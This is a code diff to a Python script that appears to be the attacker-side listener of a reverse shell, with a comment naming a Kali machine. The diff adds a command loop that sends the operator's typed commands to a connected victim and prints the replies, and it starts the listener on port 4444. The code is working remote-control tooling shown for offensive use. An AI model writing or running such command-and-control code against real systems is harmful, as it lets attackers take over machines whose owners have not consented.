@@ -25,9 +25,19 @@ def receive():
             return json.loads(json_data)
         except ValueError:
             continue
-"""
+
 def server_run():
-    Implement this function.
-"""
-listen_on('10.0.2.15', 4444) #Replace 10.0.2.15 with your Kali IP
-#server_run()
+    print("Please type your command")
+    while True:
+        cmd = input()
+        if cmd == "exit":
+            break
+        if cmd:
+            send(cmd)
+
+        rec = receive()
+        if rec:
+            print(rec)
+
+listen_on('192.168.64.2', 4444) #Replace 10.0.2.15 with your Kali IP
+server_run()
